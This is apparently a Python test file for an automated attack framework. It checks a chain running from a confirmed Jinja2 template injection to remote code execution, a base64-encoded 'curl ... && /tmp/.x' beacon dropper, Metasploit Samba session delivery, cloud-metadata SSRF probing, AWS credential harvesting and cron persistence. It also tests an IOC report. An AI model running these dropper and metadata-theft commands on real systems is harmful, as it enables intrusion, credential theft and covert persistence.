"""Tests for the senior-level upgrades:

* A — RCE bridge: confirmed SSTI -> rce_foothold -> beacon_via_rce (no creds)
* C — Environment recognition: env_probe + cloud-metadata SSRF chain
"""

import base64
import os
import re
import unittest

from phantom.automation.belief import WorldModel
from phantom.automation.guidance.commands import make_registry
from phantom.automation.guidance import kit
from phantom.automation.reasoning import ReasoningEngine

TARGET = "10.0.0.5"


def _wm_with_confirmed_ssti():
    wm = WorldModel(target=TARGET, target_type="ip")
    wm.add_finding("service", "tcp/80",
                   {"port": "80", "service": "http", "product": "nginx",
                    "version": "1.18.0"}, confidence=0.9,
                   source="scan_tcp")
    wm.add_finding("hunt_anomaly", "ssti:80:jinja-math",
                   {"cls": "ssti", "name": "jinja-math",
                    "endpoint": "/?name={{7*7}}", "signals": "eval",
                    "score": "4.8", "confirmed": True,
                    "severity": "critical", "port": "80",
                    "evidence": "response contained 49"},
                   confidence=0.8, source="hunt_web")
    return wm


class TestRceBridge(unittest.TestCase):

    def setUp(self):
        self.reg = make_registry()
        self.reason = ReasoningEngine(registry=self.reg)

    # ---- reasoning drives the bridge --------------------------------------

    def test_reasoning_hypothesizes_foothold_from_confirmed_ssti(self):
        wm = _wm_with_confirmed_ssti()
        result = self.reason.run(wm)
        ids = [h.capability_id for h in result.hypotheses]
        self.assertIn("rce_foothold", ids)
        # the deduced vuln_class carries the senior label
        self.assertTrue(any(
            f.value.get("class") == "ssti-rce"
            for f in wm.find("vuln_class")))

    def test_reasoning_proposes_beacon_when_foothold_confirmed(self):
        wm = _wm_with_confirmed_ssti()
        wm.add_finding("rce_foothold", "ssti:abc",
                       {"channel": "ssti", "marker": "abc"},
                       confidence=0.9, source="rce_foothold")
        result = self.reason.run(wm)
        self.assertIn("beacon_via_rce",
                      [h.capability_id for h in result.hypotheses])

    # ---- adapter + interpreter --------------------------------------------

    def test_rce_foothold_adapter_builds_ssti_execution_command(self):
        wm = _wm_with_confirmed_ssti()
        cap = self.reg.get("rce_foothold")
        self.assertTrue(all(p(wm) for p in cap.preconditions))
        cmd = cap.make_command(wm, {})
        self.assertIn("cycler", cmd)              # Jinja2 RCE payload
        self.assertIn(TARGET, cmd)                # aimed at the target
        self.assertIn("grep -o 'PHANTOM_RCE_", cmd)  # marker detection

    def test_rce_foothold_interpreter_parses_marker(self):
        wm = _wm_with_confirmed_ssti()
        cap = self.reg.get("rce_foothold")
        out = "RCE:channel=ssti marker=PHANTOM_RCE_aabbcc"
        findings = cap.interpret(out, wm, {})
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "rce_foothold")
        self.assertEqual(findings[0].value["channel"], "ssti")

    def test_rce_foothold_interpreter_parses_cloud_iam(self):
        wm = _wm_with_confirmed_ssti()
        cap = self.reg.get("rce_foothold")
        out = ("RCE:channel=ssrf marker=PHANTOM_RCE_1\n"
               "AccessKeyId ASIAEXAMPLE\nSecretAccessKey secret\n")
        findings = cap.interpret(out, wm, {})
        kinds = [f.kind for f in findings]
        self.assertIn("cloud_creds", kinds)
        self.assertIn("rce_foothold", kinds)

    def test_beacon_via_rce_adapter_embeds_dropper_base64(self):
        wm = _wm_with_confirmed_ssti()
        wm.add_finding("rce_foothold", "ssti:x",
                       {"channel": "ssti"}, confidence=0.9)
        cap = self.reg.get("beacon_via_rce")
        self.assertTrue(all(p(wm) for p in cap.preconditions))
        beacon_cmd = "curl -sk http://127.0.0.1:8080/p -o /tmp/.x && /tmp/.x"
        cmd = cap.make_command(wm, {"command": beacon_cmd})
        # the payload is URL-encoded inside the query string
        import urllib.parse
        self.assertIn("%20%7C%20base64%20-d%20%7C%20sh", cmd)
        # the base64 blob must decode back to the exact beacon command
        decoded = urllib.parse.unquote(cmd)
        blob = re.search(r"popen\('echo ([A-Za-z0-9+/=]+) \|", decoded).group(1)
        self.assertEqual(base64.b64decode(blob).decode(), beacon_cmd)

    # ---- planner reaches beacon without creds ------------------------------

    def test_beacon_via_rce_msf_channel_delivers_through_session(self):
        """The msf channel re-runs the exploit and pushes the dropper
        through the opened Meterpreter session (sessions -c)."""
        wm = WorldModel(target=TARGET, target_type="ip")
        wm.add_finding("service", "tcp/445",
                       {"port": "445", "service": "smb", "product": "samba",
                        "version": "3.6"}, confidence=0.9, source="scan_tcp")
        wm.add_finding("exploit_plan", "CVE-2017-7494",
                       {"cve": "CVE-2017-7494", "kind": "rce",
                        "msf_module": "exploit/linux/samba/is_known_pipid",
                        "port": "445", "severity": "high"},
                       confidence=0.9, source="service_exploit")
        wm.add_finding("rce_foothold", "msf:x",
                       {"channel": "msf"}, confidence=0.9)
        cap = self.reg.get("beacon_via_rce")
        self.assertTrue(all(p(wm) for p in cap.preconditions))
        beacon_cmd = "curl -sk http://127.0.0.1:8080/p -o /tmp/.x && /tmp/.x"
        cmd = cap.make_command(wm, {"command": beacon_cmd})
        self.assertIn("exploit/linux/samba/is_known_pipid", cmd)
        self.assertIn("sessions -c", cmd)
        self.assertIn("set RHOSTS", cmd)
        self.assertIn("set RPORT 445", cmd)
        self.assertIn("base64 -d | sh", cmd)

    def test_env_probe_internal_is_post_capability(self):
        cap = self.reg.get("env_probe_internal")
        self.assertEqual(cap.category, "post")
        self.assertIn("environment", cap.effects)

    def test_env_probe_internal_adapter_probes_from_inside(self):
        wm = WorldModel(target=TARGET, target_type="ip")
        cap = self.reg.get("env_probe_internal")
        cmd = cap.make_command(wm, {})
        self.assertIn("/proc/1/cgroup", cmd)          # container markers
        self.assertIn("169.254.169.254", cmd)         # IMDS metadata
        self.assertIn("X-aws-ec2-metadata-token", cmd)  # IMDSv2 token flow

    def test_env_probe_interp_internal_signals(self):
        wm = WorldModel(target=TARGET, target_type="ip")
        cap = self.reg.get("env_probe_internal")
        out = ("__ENV_BEGIN__\ndocker\n__ENV_CONTAINER__\n"
               "ami-id\ninstance-id\nlocal-ipv4\n__ENV_END__")
        findings = cap.interpret(out, wm, {})
        self.assertEqual(len(findings), 1)
        kinds = {k["kind"] for k in findings[0].value["kinds"]}
        self.assertIn("container", kinds)
        self.assertIn("cloud", kinds)

    def test_reasoning_proposes_internal_probe_when_beacon_up(self):
        wm = WorldModel(target=TARGET, target_type="ip")
        wm.add_finding("beacon", "established", {"target": TARGET},
                       confidence=0.95, source="c2_registration")
        result = self.reason.run(wm)
        self.assertIn("env_probe_internal",
                      [h.capability_id for h in result.hypotheses])

    def test_planner_can_plan_beacon_via_rce_without_creds(self):
        from phantom.automation.planner import Planner
        from phantom.automation.guidance.stealth import (
            StealthConfig, StealthEngine)
        wm = _wm_with_confirmed_ssti()
        wm.add_finding("rce_foothold", "ssti:x",
                       {"channel": "ssti"}, confidence=0.9)
        planner = Planner(
            self.reg, StealthEngine(wm, StealthConfig(aggressive=True)))
        plan = planner.plan(wm, goal="beacon")
        cap_ids = [s.capability.id for s in plan.steps]
        self.assertIn("beacon_via_rce", cap_ids)
        # no credentials were ever involved
        self.assertNotIn("ssh_login", cap_ids)


class TestEnvironmentRecognition(unittest.TestCase):

    def setUp(self):
        self.reg = make_registry()
        self.reason = ReasoningEngine(registry=self.reg)

    def _wm(self, ports):
        wm = WorldModel(target=TARGET, target_type="ip")
        for p in ports:
            wm.add_finding("service", f"tcp/{p}",
                           {"port": str(p), "service": "tcp",
                            "product": "", "version": ""},
                           confidence=0.9, source="scan_tcp")
        return wm

    def test_env_probe_adapter_targets_docker_api(self):
        wm = self._wm(["2375"])
        cap = self.reg.get("env_probe")
        cmd = cap.make_command(wm, {})
        self.assertIn(f"http://{TARGET}:2375/version", cmd)
        self.assertIn("__ENV_DOCKER__", cmd)

    def test_env_probe_interp_detects_container(self):
        wm = self._wm([])
        cap = self.reg.get("env_probe")
        out = '{"ApiVersion":"1.41"}\n__ENV_DOCKER__'
        findings = cap.interpret(out, wm, {})
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "environment")
        self.assertEqual(findings[0].value["kinds"][0]["kind"], "container")

    def test_reasoning_proposes_env_probe_for_docker_ports(self):
        wm = self._wm(["2375"])
        result = self.reason.run(wm)
        self.assertIn("env_probe",
                      [h.capability_id for h in result.hypotheses])

    def test_reasoning_cloud_env_from_confirmed_ssrf_metadata(self):
        wm = self._wm(["80"])
        wm.add_finding("hunt_anomaly", "ssrf:80:cloud-metadata",
                       {"cls": "ssrf", "name": "cloud-metadata",
                        "endpoint": "/?url=http://169.254.169.254/latest/meta-data/",
                        "signals": "ami-id", "score": "4.9", "confirmed": True,
                        "severity": "critical", "port": "80", "evidence": "ami-id"},
                       confidence=0.8, source="hunt_web")
        result = self.reason.run(wm)
        envs = wm.find("environment")
        self.assertTrue(envs)
        self.assertEqual(envs[0].value["kinds"][0]["kind"], "cloud")
        self.assertIn("rce_foothold",
                      [h.capability_id for h in result.hypotheses])

    def test_anomaly_probe_library_has_cloud_metadata_ssrf(self):
        from phantom.automation.exploit.anomaly import probe_library
        probes = probe_library().get("ssrf", [])
        self.assertTrue(any("cloud-metadata" in p.name for p in probes))


class TestCleanupIocs(unittest.TestCase):
    """D — the operator report must list the observable fingerprints."""

    def test_raw_report_lists_iocs(self):
        from phantom.automation.reporting import FindingEntry, RawReport
        r = RawReport(target=TARGET, goal="deliver", started="now")
        r.actions = [
            {"capability": "beacon_via_rce", "ok": True,
             "command": "curl -sk http://127.0.0.1:8080/api/v1/payload_linux "
                        "-o /tmp/.x && /tmp/.x 127.0.0.1 8080 0"}
        ]
        r.findings = [
            FindingEntry(kind="rce_foothold", key="k",
                         value={"channel": "ssti"}, confidence=0.9,
                         source="x", target=TARGET),
            FindingEntry(kind="cloud_creds", key="k2",
                         value={"provider": "aws"}, confidence=0.8,
                         source="x", target=TARGET),
            FindingEntry(kind="persistence", key="k3",
                         value={"method": "cron"}, confidence=0.9,
                         source="x", target=TARGET),
        ]
        md = r.to_markdown()
        self.assertIn("## Cleanup & IOCs", md)
        self.assertIn("/tmp/.x", md)                       # staging path
        self.assertIn("http://127.0.0.1:8080", md)         # dropper URL
        self.assertIn("RCE channel used on", md)
        self.assertIn("Cloud IAM credentials harvested (aws)", md)
        self.assertIn("Persistence installed on", md)
        self.assertIn("cron", md)


if __name__ == "__main__":
    unittest.main()
